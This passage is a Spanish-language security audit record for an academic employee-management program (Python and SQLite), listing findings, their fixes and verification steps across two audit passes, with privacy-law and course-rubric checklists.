> Tabla vigente desde la pasada 7 (23-sep-2026). Hasta entonces el `EMPLEADO` consultaba el clima con
> el permiso `proyectos`, el mismo que administra proyectos: ver §2.12.

**El consumo de APIs también está restringido por sesión y rol**: nadie llega al menú sin
autenticarse; el clima exige `proyectos` y la planilla, que combina los sueldos con el tipo de
cambio, exige `empleados`.

#### La red: tiempo de espera, códigos HTTP y respuestas no confiables

Todo el tráfico sale por **un solo método**, `ServicioExterno.__consultar`, y toda falla sale de ahí
como `ServicioNoDisponible`, que el menú atrapa y muestra sin cerrarse.

| Falla | Cómo se controla | Mensaje |
|---|---|---|
| El servidor no contesta | `timeout=(3.05, 10)`: 3 s para conectar, 10 para leer. Sin él, `requests` espera para siempre | «no respondió a tiempo» |
| Sin red o DNS caído | `requests.ConnectionError` | «No hay conexión… Revise la red» |
| Cualquier otra falla de `requests` | `RequestException`, la base de todas | «No se pudo completar la consulta» |
| `400` · `404` · `429` · `5xx` · otro ≠ `200` | Se revisa el código **antes** de leer el cuerpo | un mensaje por código, con el número |
| Cuerpo que no es JSON | `ValueError` de `respuesta.json()` | «no es JSON válido» |
| JSON sin los campos o con otro tipo | `KeyError`/`TypeError`/`IndexError` y comprobación de tipo numérico | «formato inesperado» |
| Tipo de cambio `0`, negativo, `Infinity` o `NaN` | `math.isfinite()` y `> 0` | «formato inesperado» |
| Nombre de ciudad con escapes de terminal, **venido de la red** | `isprintable()`; si falla, se muestra el que escribió el usuario | — |

Las entradas que van a la API se validan **antes** de salir: la ciudad con un patrón de letras
(Unicode), espacios, guion, punto y apóstrofo, de 2 a 80 caracteres, y viaja en `params=`, que la
codifica; la moneda contra una **lista blanca** `USD`, `EUR`, `UF`, porque termina en la ruta de la
URL. Solo HTTPS, y la verificación del certificado nunca se desactiva.

Reproducción: `python3 servicios.py` simula cada fila de la tabla sin conectarse. En vivo:
`HTTPS_PROXY=http://127.0.0.1:9 python3 main.py` corta la red, y el menú sigue funcionando.

#### Mensajes de error que no filtran nada

La guía lo pide textual: «restringir la exposición de información sensible en los mensajes de
error». Tres cambios en `main.py`:
- `OperationalError` ya no imprime el texto de SQLite, que puede traer la ruta de la base.
- `except Exception` imprime solo el **tipo** del error, no su mensaje.
- los errores de red nunca muestran la URL ni la traza: `raise … from None` corta la cadena, y el
  mensaje lo escribe el sistema, no la librería.

#### Información sensible, en resumen

| Dato | Protección |
|---|---|
| Claves | solo su hash scrypt; `getpass` al teclearlas; nunca se imprimen ni se registran |
| Sueldos | privados, solo con permiso `empleados`; fuera de listados, informes y CSV |
| Base de datos | `0600`; `.gitignore` excluye `*.db` y los `*.csv` exportados |
| Llaves de API | no hay: ninguna de las dos APIs la exige. Si una la pidiera, iría en una variable de entorno o en `.env`, ya excluido por `.gitignore`, nunca en el código |

### 2.12 Pasada 7: la rúbrica como lista de chequeo · Grave

Séptima pasada, 23-sep-2026. Método: cruzar los 22 indicadores y los 66 miembros del diagrama con el
código, línea por línea (una matriz interna del equipo), y convertir cada brecha en una prueba antes de
corregirla. Plan: `docs/planes/2026-09-23_auditoria-rubrica-por-etapas.md`.

#### El login moría con un hash corrupto · Grave

`iniciar_sesion()` corre fuera de `atender()`, y `main()` solo atrapa `sqlite3.Error`, `Cancelado`,
`KeyboardInterrupt` y `EOFError`. Un `hash_clave` alterado en la base hace que `verificar_clave`
lance `ValueError`, y una clave con un carácter no codificable (`\udcff`) lanza `UnicodeEncodeError`
en `clave.encode()`: **en los dos casos el programa terminaba con traceback en la pantalla de login**.
Reproducido con un guion sobre el código del 21-sep antes de corregir. Ahora `iniciar_sesion()`
atrapa `ValueError` (padre de los dos) y responde lo mismo que a una clave mala.

#### La demora del login, medida

§2.11 prometía la misma demora para los tres rechazos, pero nunca se había medido. Veinte llamadas
a `Usuario.autenticar` por caso, mediana con `time.perf_counter`:

| Caso | Mediana |
|---|---|
| cuenta inexistente | 255,3 ms |
| clave mala | 255,5 ms |
| cuenta bloqueada | 255,6 ms |
| clave correcta (referencia) | 263,6 ms |

Diferencia entre los tres rechazos: **0,1 %**. El tiempo no revela si la cuenta existe ni si está
bloqueada. La clave correcta tarda unos 8 ms más porque además escribe el contador en la base; no
filtra nada, porque en ese caso el usuario ya entra.

#### Proyectos y horas solo en memoria · Alta

`Proyecto`, la asociación «participa en» y los registros de tiempo vivían en listas
(`Proyecto.__empleados`, `Proyecto._registros`, `Empleado._proyectos`, `Empleado.__registros`). Las
tablas `proyecto`, `empleado_proyecto` y `registro_tiempo` existían en el esquema y **ningún código
las leía ni las escribía**: todo lo que se registraba se perdía al cerrar. Es el mismo defecto que
§2.8 corrigió para Departamento ↔ Empleado, y se corrige igual: **las relaciones viven solo en la
base**, y las reglas que cruzan tablas (el empleado participa en el proyecto, y entonces se inserta
la hora) van en un mismo `with conectar()`. Borrar un proyecto con horas imputadas se rechaza antes
del `DELETE`: esa historia no se borra.

#### El EMPLEADO administraba proyectos · Media

El permiso `proyectos` servía a la vez para consultar el clima y para administrar proyectos, y el
`EMPLEADO` lo tenía. Ahora hay un módulo `tiempo` para registrar horas, y `proyectos` queda para
administrar. El `EMPLEADO` solo tiene `tiempo`, y **solo sobre su propio empleado**: su cuenta está
vinculada a él por `usuario.empleado_id` (la asociación «identifica a» del diagrama, que existía en
el esquema sin código). Una cuenta `EMPLEADO` sin empleado no se puede crear.

Consecuencia declarada: la clave foránea es `ON DELETE CASCADE`, así que **borrar un empleado borra
su cuenta**. Es lo buscado: una cuenta que identifica a alguien que ya no está no debe seguir
entrando.

#### Dos mensajes con la ruta del archivo · Baja

`crear_tablas()` e `Informe.exportar()` imprimían el texto de un `OSError`, que trae la ruta absoluta
(`[Errno 13] Permission denied: '/home/…/ecotech.db'`). Es la misma fuga que §2.11 cerró en
`main.py`; se escapó porque estaba en `ecotech.py`. Ahora los dos dan un mensaje fijo.

#### El diagrama y el código, comparados por un programa

La correspondencia UML ↔ código se revisaba leyendo. En esta pasada la comprueba un script que
extrae los 68 miembros del diagrama vigente (`EcoTech_UML_VIGENTE.drawio`) y busca cada uno en su clase, con su visibilidad y su
lista de parámetros. Encontró una diferencia que la lectura había dejado pasar:
`autenticar(nombre, clave)` en el diagrama y `nombre_usuario` en el código. Corregida en el código;
hoy son 68 de 68 (y 89 de 89 tras el cierre de la U3).

#### Cómo se comprobó que las pruebas nuevas prueban algo

Se rompieron a propósito cinco reglas, una por vez, en una copia de `ecotech.py` (sin comprobar la
asignación, sin comprobar que las horas son propias, borrar un proyecto con horas, dar `proyectos` al
`EMPLEADO`, cuenta `EMPLEADO` sin empleado). **La autoverificación falló las cinco veces.** En una,
falló por el motivo equivocado: la prueba de «solo sus propias horas» usaba un empleado que ni
siquiera participaba en el proyecto, así que la frenaba otra regla. Se corrigió para que el permiso
fuera la única barrera, y la mutación volvió a fallar, ahora en el `assert` correcto. La mutación
«borrar un proyecto con horas» la detiene además la clave foránea: son dos capas, y el `ValueError`
existe para dar un mensaje claro antes de llegar a la base.

### 2.13 Pasada 8: auditoría integral de cierre · 4 Medios corregidos

Octava pasada, 23-sep-2026, con el **Método Auditoría** del vault (ciclo de 7 pasos, severidad
común, confianza CONFIRMADO/PLAUSIBLE) y el plan `docs/planes/2026-09-23_auditoria-integral-u3.md`.
**Caja blanca, sistema propio.** Criterios: la rúbrica, la guía ES02, el bloque 5 del docente
(`5_poo_servicios_rubensch.pdf`), OWASP Top 10:2025 y ASVS 5.0 nivel 1.

**Independencia:** además de la autoauditoría, un **agente de contexto limpio** revisó los tres
archivos contra OWASP y la lámina 31, sin leer antes esta auditoría (Método §1.2.5). **Cada hallazgo
del agente se reprodujo en ejecución antes de entrar aquí**; los de origen «agente» marcados
CONFIRMADO fueron reproducidos, no solo leídos.

#### Resumen ejecutivo

Ningún hallazgo Crítico ni Alto. La base de seguridad es sólida: SQL 100 % parametrizado, scrypt con
señuelo y bloqueo persistido, autorización en dos capas (verificada con la matriz real de 3 roles × 25
opciones), una sola puerta hacia la red que falla cerrada, y mensajes de error sin detalle interno.
Quedan **4 Medios**: el cierre por inactividad se salta en la pausa, el clima no se valida por rango
antes de decidir, cualquier rol ve el contacto de toda la plantilla, y las versiones fijadas de las
dependencias tienen avisos conocidos (no explotables con este uso). Además hay 9 Bajos y 7 Informativos.

#### Inventario y amenazas (fases 1 y 2)

- **Datos personales tratados:** nombre, dirección, teléfono, correo y **sueldo** de empleados; nombre
  de usuario y hash de su clave. Caso académico: no hay titulares reales.
- **Límites de confianza:** teclado → `main.py` → `ecotech.py` → SQLite (archivo `0600`) ·
  `servicios.py` → internet (Open-Meteo, mindicador.cl) · repositorio público en GitHub.

| STRIDE | Amenaza concreta | Control existente | Resto |
|---|---|---|---|
| Suplantación | Entrar como otro | scrypt, bloqueo tras 5 fallos, demora igual | A8-01 (sesión que no caduca) |
| Manipulación | Datos alterados en la base o en la respuesta de la API | reconstrucción por constructor, `CHECK`, validación de la respuesta | A8-02 (clima sin rango) |
| Repudio | Negar una acción | — | A8-09 (sin registro de eventos) |
| Divulgación | Sueldos y contactos a quien no corresponde | sueldo solo con `empleados`, `0600`, mensajes fijos | A8-03, A8-11 |
| Denegación | Bloquear cuentas o colgar el menú | `timeout`, techos de enteros | A8-15 (bloqueo dirigido, aceptado) |
| Elevación | Operar sin permiso | `autorizar()` en el menú y en el dominio | — (matriz real sin desvíos) |

#### Hallazgos

| ID | Sev. | Conf. | Origen | Evidencia | Impacto | Recomendación |
|---|---|---|---|---|---|---|
| A8-01 | Medio | CONFIRMADO | agente | `main.py:668-684`: `ultima_actividad` se reinicia **después** de la pausa | Terminal abandonada 2 h en «Presione Enter…» → la sesión sigue viva y ejecuta la opción siguiente (reproducido con reloj simulado; control: 2 h en «Opción:» sí la cierra) | Medir la inactividad también durante la pausa |
| A8-02 | Medio | CONFIRMADO | agente | `servicios.py:95-132` (`__clima_de`) valida tipo pero no rango | Con humedad 150 % y viento −5 imprime «Condiciones aptas para trabajo en terreno» y recién después falla el guardado; la memoria de sesión lo serviría como referencial | Validar rango (y coordenadas) en `servicios.py` antes de decidir y de guardar en memoria, igual que `__extraer_valor` |
| A8-03 | Medio | CONFIRMADO | agente | `main.py:182-187` (opción 5, sin permiso) + `ecotech.py:246-247` | Un EMPLEADO lista correo y teléfono de toda la plantilla (reproducido: 2 correos ajenos, 3 teléfonos). Mínimo privilegio y minimización, Ley 21.719 art. 14 quater | Exigir `empleados` en la opción 5, o un listado reducido (id y nombre) para los demás roles |
| A8-04 | Medio | CONFIRMADO | propio | `requirements.txt` (fijado en la pasada anterior) | OSV.dev, 23-sep-2026: `requests` 2.32.5 (2 avisos), `urllib3` 2.6.3 (4) e `idna` 3.11 (2). Ninguno aplica al uso actual: `extract_zipped_paths`, API de streaming, `ProxyManager` de bajo nivel e `idna.encode` sobre hosts fijos | Subir a `requests` 2.34.2, `urllib3` 2.8.0, `idna` 3.20, `certifi` 2026.7.22 (`requests` ≥ 2.33 usa `charset-normalizer`, no `chardet`), probado en un entorno aislado |
| A8-05 | Bajo | CONFIRMADO | agente | `servicios.py:54-62` (`_cargar_env`) | Un `.env` que no es UTF-8 hace que `import main` muera con `UnicodeDecodeError` (reproducido); además carga cualquier clave, incluidas `HTTPS_PROXY` o `REQUESTS_CA_BUNDLE` | Aceptar solo `ECOTECH_*` y atrapar el error de lectura con un mensaje fijo |
| A8-06 | Bajo | PLAUSIBLE | agente | `servicios.py:174`: `requests.get` sigue redirecciones | Una redirección de `https` a `http` se seguiría sin revisar el esquema; la prueba del `302` no representa a `requests` real | `allow_redirects=False` (un 3xx cae en el `!= 200`) o revisar `respuesta.url` |
| A8-07 | Bajo | CONFIRMADO | agente | `main.py:366` y `main.py:506`: `date.today()` | En fin de semana mindicador entrega el último día hábil y se guarda con la fecha de hoy | Guardar la fecha de la serie, validada |
| A8-08 | Bajo | CONFIRMADO | agente | `main.py:566-575` usa el `Usuario` de la sesión | Si se borra la cuenta (o su empleado) desde otra terminal, la sesión abierta sigue con su rol | Recargar el usuario por id antes de cada acción |
| A8-09 | Bajo | CONFIRMADO | ambos | ningún archivo usa `logging` | Sin registro de logins fallidos, bloqueos ni permisos denegados (OWASP A09; registro de incidentes de la Ley 21.719 art. 14 sexies) | Registro a archivo `0600`, sin claves ni datos personales |
| A8-10 | Bajo | CONFIRMADO | agente | `ecotech.py:915-922` (`_validar_clave`) | Reglas de composición sin lista de claves comunes (ASVS 5.0 V6.2); sin cambio de clave persistido ni desbloqueo | Largo mínimo + lista de claves comunes; persistir `cambiar_clave` |
| A8-11 | Bajo | CONFIRMADO | agente | `ecotech.py:1021-1045` (`exportar`) | `informe_dotacion.csv` queda con permisos por defecto (`0644`), con nombres, correos y teléfonos | `chmod 0600` tras escribir, como la base |
| A8-12 | Bajo | CONFIRMADO | propio | `ecotech_new/Unidad2_bkp.zip` contiene `ecotech.db` (45 KB, 15-sep) | No viaja en git, pero **comprimir `ecotech_new/` para el AAI lo incluye** | Sacar los `*.zip` de la carpeta antes de comprimir |
| A8-13 | Bajo | CONFIRMADO | propio | `main.py:119-127` (`pedir_entero`) | Quitar el techo no lo detecta ninguna prueba automática: solo lo contiene el `except Exception` final («Error inesperado (OverflowError)») | Una autoverificación mínima de `main.py` o del techo |
| A8-14 | Info | PLAUSIBLE | agente | `servicios.py:174` | El tiempo de lectura es entre bytes y el cuerpo no tiene tope; solo alcanzable con una URL configurada hostil | Aceptar por escrito o `stream=True` con tope |
| A8-15 | Info | CONFIRMADO | agente | `ecotech.py:976-1004` | Quien conozca un usuario puede bloquearlo 5 min, repetidamente | Riesgo aceptado: es el costo del bloqueo por cuenta |
| A8-16 | Info | CONFIRMADO | agente | contador en dos pasos | No atómico; un solo proceso | Ya declarado en §4 |
| A8-17 | Info | CONFIRMADO | agente | `Empleado.actualizar_contacto` | Sin permiso en el dominio; el comentario de `main.py` sobre «los métodos lo vuelven a revisar» no vale para la opción 7 | Ya declarado en §3.1 |
| A8-18 | Info | CONFIRMADO | propio | listados de proyectos | N+1: 2 conexiones por proyecto; 1000 proyectos en 0,7 s | Aceptado a esta escala |
| A8-19 | Info | CONFIRMADO | propio | GitHub | Repositorio público, `main` sin protección, un colaborador con `push` | Proteger `main`; **HUMANO:** confirmar 2FA de la cuenta |
| A8-20 | Info | CONFIRMADO | propio | mensajes de validación | «Horas inválidas: inf» repite lo tecleado; no es sensible | — |

#### Seguimiento: corrección del 23-sep-2026

Plan `docs/planes/2026-09-23_correccion-pasada8.md`. Cada corrección tiene una prueba que **falla con
el código anterior** (reproducción) o **con la regla quitada** (mutación). Commits sin coautor.

| ID | Estado | Corrección | Verificación | Commit |
|---|---|---|---|---|
| A8-01 | **Corregido** | la inactividad se mide también durante la pausa | `p8_inactividad.py`: 2 h en la pausa cierran la sesión; la misma prueba falla contra el código anterior | `2d1c1c8` |
| A8-02 | **Corregido** | rango de las cuatro medidas y de las coordenadas en `servicios.py`, antes de decidir y de guardar en memoria | 7 cuerpos fuera de rango rechazados, bordes aceptados; mutación de la humedad detectada; el caso del agente ya no dice «aptas» | `41aec6a` |
| A8-03 | **Corregido** | la opción 5 muestra solo id y nombre a quien no tiene `empleados` | EMPLEADO y GERENTE: 0 correos y 0 teléfonos; RRHH: resumen completo; matriz de permisos igual | `147089f` |
| A8-04 | **Corregido** | `requests` 2.34.2, `urllib3` 2.8.0, `idna` 3.20, `certifi` 2026.7.22, `charset-normalizer` 3.5.1 | 0 avisos en OSV; suite y sesión real en verde **dentro de un entorno aislado** con esas versiones | `ad17a38` |
| A8-05 | **Corregido** | el `.env` solo aporta `ECOTECH_*`; si no se puede leer, se ignora con aviso | `.env` latin-1: el programa arranca; `HTTPS_PROXY` no entra; dos mutaciones detectadas | `0744e55` |
| A8-07 | **Corregido** | el tipo de cambio se guarda con la fecha de la serie (validada, no futura) | fecha ausente, mal formada o futura rechazadas; el historial guarda el 19-09 que informa la API | `f125a51` |
| A8-11 | **Corregido** | el CSV exportado queda en `0600` | la autoverificación lo comprueba; mutación detectada | `0744e55` |
| A8-12 | **Corregido** | los tres `.zip` salieron de `ecotech_new/` a `02_Evaluacion1_EcoTech/_respaldos/` (movidos, íntegros) | `ls ecotech_new/*.zip` vacío | — (fuera de git) |
| A8-06, A8-08, A8-09, A8-10, A8-13 | Abiertos | fuera del alcance de esta corrección | — | — |
| A8-14 a A8-20 | Informativos | A8-15 y A8-18 aceptados; el resto, declarados | — | — |

**Riesgo que se mantiene, declarado otra vez (§3.3):** el informe de dotación (opción 13) sigue
incluyendo correo y teléfono para quien tiene el permiso `informes`, porque es lo que define el resumen
del diagrama.

#### Lo que está bien (con evidencia)

- **Autorización:** la matriz real, cada rol por cada opción, coincide con la tabla de §2.11, y en
  ningún caso se piden datos antes de negar (guion de pruebas local del equipo).
- **Entradas:** 13 casos hostiles (escapes de terminal, bidi, 10 000 caracteres, enteros de 26 dígitos,
  fechas imposibles, SQL en la moneda, `1e400`, `nan`) rechazados con mensaje y sin traza.
- **Secretos:** el historial completo (32 commits) no contiene llaves ni tokens; solo las claves de
  prueba de las autoverificaciones, sobre bases temporales. Lo publicado no incluye `.db`, `.env`,
  `.csv`, `comentado/` ni PDF.
- **Documentación usada al pie de la letra:** en un clon limpio del repositorio, los comandos del
  README terminan en `OK`, `cp .env.example .env` funciona y el primer uso pide crear la cuenta de
  administrador.
- **Pruebas que prueban:** las mutaciones de `isprintable()`, `sin_formula()` y el techo de enteros se
  detectan (el techo, por la segunda capa: A8-13).
- **Credenciales:** ninguna en el código que se ejecuta; la cuenta de administrador se crea en el
  primer uso.

#### Privacidad (Ley 21.719, fase 3) — caso académico, sin titulares reales

| Obligación | Estado | Evidencia |
|---|---|---|
| Minimización y mínimo privilegio | ⚠️ | sueldo protegido; contacto visible para todos los roles (A8-03) |
| Seguridad del tratamiento (art. 14 quinquies) | ⚠️ | base `0600`, scrypt; CSV sin `0600` (A8-11) |
| Supresión | ✅ / ⚠️ | borrar un empleado borra horas, asignaciones y cuenta; queda un respaldo con base en la carpeta (A8-12) |
| Registro de incidentes (art. 14 sexies) | ⚠️ | sin registro de eventos (A8-09) |
| Transferencia internacional | ✅ | a las APIs solo viajan un nombre de ciudad y un código de moneda |
| Retención | Informativo | sin plazo definido: caso académico |

#### Bloque 5 del docente, lámina por lámina

| Lámina | Pide | Estado |
|---|---|---|
| 8 | `requirements.txt` con versión exacta | ✅ (con A8-04) |
| 9, 11 | `timeout` y `params` | ✅ `servicios.py:167-204` |
| 14-15 | Las cinco fallas y `try` de lo concreto a lo general | ✅ |
| 16 | Degradar antes que interrumpir, avisando | ✅ memoria y base (`SALIDA_TERMINAL.md` §6.2-6.3) |
| 20-21 | Clave fuera del código, `.env`, `.gitignore`, `.env.example` | ✅ (ninguna API pide llave) |
| 22 | Cliente con estado privado | ✅ `ServicioExterno` |
| 24 | Token en código, `http`, imprimir la respuesta entera | ✅ ninguno |
| 25-26 | Validar la respuesta: tipo, claves, **rango** | ⚠️ tipo de cambio sí; clima sin rango (A8-02) |
| 29-30 | Pedir, validar, guardar, informar (y contar descartados) | ✅ opciones 11, 12 y 21 |
| 31 | Los cinco aspectos | ✅ salvo protocolo (A8-06) y uso de la respuesta del clima (A8-02), parciales |
| 35 | Cliente, validación, `.env.example`, salida con fallo provocado, tabla de IA | ✅ los cinco |

#### Límites de esta pasada

No se probó en Windows. No se instalaron `bandit`, `pip-audit` ni `gitleaks`: la SCA se hizo contra
la API de OSV.dev y el escaneo de secretos con expresiones regulares sobre `git log -p`. La 2FA de la
cuenta de GitHub la confirma el dueño (A8-19).

## 3. Decisiones declaradas

### 3.1 `actualizar_contacto` no pide permiso

`Empleado.actualizar_contacto` sobrescribe a `Persona.actualizar_contacto`, que **el diagrama fija en
dos parámetros**. Un tercero rompería la sustitución de la subclase y la correspondencia que evalúa el
criterio 2.1.1. El dato es menos sensible que el salario y menos destructivo que un borrado, así que
el costo se asume y se declara. Si hubiera que cerrarlo, se cambia primero el diagrama.

**Cerrado en la pasada 6 sin tocar el diagrama:** el menú revisa el permiso `empleados` antes de
la opción 7 (§2.11). El método sigue sin pedirlo; quien lo llame desde otro código tiene que
autorizar antes.

### 3.2 `Empleado._proyectos` modificable desde fuera

Lleva un guion bajo porque lo escribe `Proyecto`. Se puede saltar la regla con
`empleado._proyectos.append(proyecto)`. No se corrige: con todo en un archivo, el guion bajo significa
lo que dice la convención (interno al módulo), y hacerlo privado obligaría a inventar métodos que el
UML no tiene. Donde se pudo cerrar sin inventar métodos, se cerró: la relación con `Departamento` ya
no tiene lista en memoria (§2.8). Sigue vigente solo porque `Proyecto` vive en memoria.

> **Resuelto el 23-sep-2026 (pasada 7, §2.12):** `Proyecto` se persiste y la relación vive en la
> tabla `empleado_proyecto`. `Empleado._proyectos` ya no existe, así que no hay nada que modificar
> desde fuera.

### 3.3 Datos de contacto en el resumen exportable

`obtener_resumen()` emite nombre, correo y teléfono, así que un informe exportado lleva el directorio
interno. Es lo que define el diagrama, y la mitigación importante está puesta: **el salario queda fuera
del resumen** y tiene su propio método con permiso.

### 3.4 No existe autenticación · Unidad 3

> **Corregido el 21-sep-2026 en la pasada 6 (§2.11)**, con el diseño que sigue. Se deja el
> texto original como registro.

**Era el hallazgo más grave y el único que no se corregía.** La tabla `usuario` existe y ningún código
la escribe; el solicitante del menú se construye fijo. Consecuencia, sin adornos: **los permisos
protegen contra el uso incorrecto, no contra un atacante**, porque nadie verifica que quien dice ser
administrador lo sea.

**Por qué no se implementa ahora:**
1. **Es Unidad 3.**
2. **Rompería la correspondencia con el diagrama**: `Usuario` ganaría métodos que el UML no tiene. El
   lugar correcto para abrir esa puerta es primero el diagrama.

**Diseño para la Unidad 3:**
- `Usuario.guardar()` y `Usuario.buscar_por_nombre()`, con el mismo patrón CRUD, escribiendo
  `hash_clave` tal como lo produce `_hashear`.
- `autenticar(nombre, clave)` que devuelva el `Usuario` o `None`, y que **tarde lo mismo con un
  usuario inexistente que con una clave equivocada**, verificando siempre contra un hash, real o
  señuelo. Si no, el tiempo de respuesta revela qué cuentas existen.
- **Protección contra fuerza bruta:** contador de intentos fallidos por cuenta con **bloqueo
  temporal**. Un límite de tiempo en `input()` no sirve: lo que frena la fuerza bruta es limitar los
  intentos fallidos.
- El `solicitante` del menú pasa a ser el usuario autenticado.

### 3.5 Defectos latentes en `Usuario` · parcial

Con la Unidad 3, `Usuario` ya se persiste.
- **`cambiar_clave` no persiste**: cambia el atributo en memoria, y el menú no la ofrece. Se declara:
  cuando haga falta, es un `UPDATE` de `hash_clave` con el mismo patrón que `autenticar`.
- **`verificar_clave` confiaba en el formato del hash** y un hash corrupto reventaba al desempacar.
  **Corregido:** ahora comprueba el formato y lanza un `ValueError` explicado.

---

## 4. Fuera de alcance

- **Cifrado en reposo.** SQLite no lo trae. El `0600` (§2.3) es la mitigación que cabe: no cifra,
  pero saca el archivo del alcance de otros usuarios.
- **Concurrencia.** Escribe un solo proceso. El contador de intentos fallidos se lee y se escribe
  en dos pasos; con varios procesos habría que usar `SET intentos_fallidos = intentos_fallidos + 1`. Con varios, la conexión por operación deja ventanas entre
  el `buscar` y el `eliminar` del menú.
- ~~**`Informe.exportar` no es alcanzable desde el menú.**~~ Desde la Unidad 3 sí: opción 13.
- **La carpeta permitida para exportar depende del directorio de trabajo** (`Path.cwd()`). La guarda
  contra path traversal funciona igual; lo que cambia es cuál es la carpeta permitida.

---

## 5. Cómo repetir la auditoría

Desde la carpeta del proyecto:

```bash
python3 ecotech.py     # autoverificación del dominio, el CRUD y el login: termina en OK en ~5 s
python3 servicios.py   # autoverificación de las APIs, sin red: termina en OK
python3 main.py        # la primera vez pide crear la cuenta de administrador
ls -l ecotech.db       # tiene que decir -rw-------
```

La autoverificación incluye los casos de las siete pasadas: rechazos del dominio y de entradas,
credenciales y formato del hash, escrituras sin permiso, CRUD de departamentos, empleados y
proyectos, relaciones leídas desde otra instancia, horas propias y ajenas, cascadas al borrar,
login y bloqueo, permisos del archivo y celdas del CSV. **Si alguien afloja una guarda, un `assert`
se cae**: la pasada 7 lo comprobó rompiendo cinco reglas a propósito (§2.12).

Los espejos comentados (carpeta local `comentado/`, fuera del repositorio desde el 15-sep-2026)
tienen que seguir siendo el mismo código:
```bash
diff <(sed 's/[[:space:]]*#.*$//; /^[[:space:]]*$/d' ecotech.py) \
     <(sed 's/[[:space:]]*#.*$//; /^[[:space:]]*$/d' comentado/ecotech_corto.py)
```
(igual con `comentado/Comments_Explicacion_Larga/ecotech_largo.py` y con `main`).
